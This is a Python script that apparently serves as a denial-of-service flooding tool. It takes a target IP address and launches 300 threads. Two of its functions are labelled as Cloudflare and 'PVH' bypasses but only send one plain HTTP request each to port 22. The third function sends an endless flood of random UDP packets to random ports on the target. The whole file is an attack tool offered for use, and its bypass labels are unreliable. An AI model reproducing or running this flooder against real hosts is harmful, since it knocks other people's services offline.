import socket
import random
import time
import threading
# PVH BYPASS
def pvh_bypass(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 22))
        s.send("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n")
        s.close()
    except:
        pass

# CLOUDFLARE BYPASS
def cloudflare_bypass(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 22))
        s.send("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\n\r\n")
        s.close()
    except:
        pass

# RAW WAF MIX NUDP RUDP RTCP SYN ACK BROWSER SPO
def raw_waf_mix_nudp_rudp_rtcp_syn_ack_browser_spo(target):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1024)
        
        while True:
            sock.sendto(bytes, (target, random.randint(1,65535)))
            sock.sendto(bytes, (target, random.randint(1,65535)))
            sock.sendto(bytes, (target, random.randint(1,65535)))
            sock.sendto(bytes, (target, random.randint(1,65535)))
            sock.sendto(bytes, (target, random.randint(1,65535)))
            sock.sendto(bytes, (target, random.randint(1,65535)))
            sock.sendto(bytes, (target, random.randint(1,65535)))
            sock.sendto(bytes, (target, random.randint(1,65535)))
    except:
        pass

# Main function
def main():
    target = input("Enter target IP address: ")
    threads = []
    
    for i in range(100):
        t = threading.Thread(target=pvh_bypass,args=(target,))
        t.start()
        threads.append(t)
        
    for i in range(100):
        t = threading.Thread(target=cloudflare_bypass,args=(target,))
        t.start()
        threads.append(t)
        
    for i in range(100):
        t = threading.Thread(target=raw_waf_mix_nudp_rudp_rtcp_syn_ack_browser_spo,args=(target,))
        t.start()
        threads.append(t)
        
    time.sleep(10)
    
    for thread in threads:
        thread.join()
        print ("/", end="")

if __name__ == "__main__":
    main()
    
